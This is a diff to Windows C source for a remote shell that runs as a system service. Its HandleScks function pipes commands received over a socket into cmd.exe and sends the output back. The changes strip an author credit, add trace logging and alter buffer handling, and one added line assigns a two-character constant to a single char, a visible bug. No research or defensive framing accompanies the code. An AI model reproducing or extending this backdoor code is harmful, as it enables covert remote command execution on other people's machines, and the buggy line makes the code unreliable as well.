@@ -102,7 +102,7 @@ DWORD WINAPI HandleScks(LPVOID lpParam)
    int offset = 0, bRecv;
     
    //Send socket some info
-   if(send(theSck, "Remote Shell\r\nCoded by ExtremeCoder\r\n\r\n", sizeof("Remote Shell\r\nCoded by ExtremeCoder\r\n\r\n"), 0) == SOCKET_ERROR) goto closeSck;
+   if(send(theSck, "Remote Shell\r\n\r\n", sizeof("Remote Shell\r\n\r\n"), 0) == SOCKET_ERROR) goto closeSck;
     
    //Create the main transfer pipe
    if(!CreatePipe(&stdinRd, &stdinWr, &sa, 0) || !CreatePipe(&stdoutRd, &stdoutWr, &sa, 0)) {
@@ -149,23 +149,30 @@ DWORD WINAPI HandleScks(LPVOID lpParam)
        firstsend = true;
         
        do {
-               //Read Console Output
-               ReadFile(stdoutRd, buff, 1000, &stuff, NULL);
+
+               ReadFile(stdoutRd, (char*)buff, sizeof(buff), &stuff, NULL);
+               int bytes = 0;
+               LOG_TRACE("ServiceMain", "ReadFile %s", buff);
                if(firstsend) 
                { 
-               send(theSck, buff + offset, strlen(buff) - offset, 0); 
-               firstsend = false; 
+                   
+                   bytes = send(theSck, buff + offset, strlen(buff) - offset, 0);
+                   LOG_TRACE("ServiceMain::Send1", "sent %d bytes: \"%s\"", bytes, buff);
+                   firstsend = false; 
                }
-               else send(theSck, buff, strlen(buff), 0);
+               else {
+                   bytes = send(theSck, buff, strlen(buff), 0);
+                   LOG_TRACE("ServiceMain::Send2", "sent %d bytes: \"%s\"", bytes, buff);
+               }
           } while(stuff == 1000);
        }
         
        if(!strcmp(recvBuff, "\r\n")) offset = 0;
        bRecv = recv(theSck, recvBuff, 1000, 0);
        if((bRecv == 0) || (bRecv == SOCKET_ERROR)) break;
-       //recvBuff[bRecv] = '';
+       recvBuff[bRecv] = '\r\n';
        //Read data from stream and pipe it to cmd.exe
-       WriteFile(stdinWr, recvBuff, strlen(recvBuff), &stuff, NULL);
+       WriteFile(stdinWr, (char*)recvBuff, strlen(recvBuff), &stuff, NULL);
        offset = offset + bRecv;
    }
     
@@ -213,7 +220,7 @@ void ServiceMain(int argc, char** argv)
     // We report the running status to SCM. 
     ServiceStatus.dwCurrentState = SERVICE_RUNNING; 
     SetServiceStatus (hStatus, &ServiceStatus);
-    LOG_TRACE("ServiceMain", "1");
+    
     // The worker loop of a service
     if (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
     {
@@ -290,7 +297,7 @@ int _MainFunction(int argc, char** argv)
     //1 extra for null character, string termination
     char* buffer;
     buffer = (char*)malloc((MAXRECV + 1) * sizeof(char));
-    LOG_TRACE("ServiceMain", "5");
+
     for (i = 0; i < 30; i++)
     {
         client_socket[i] = 0;
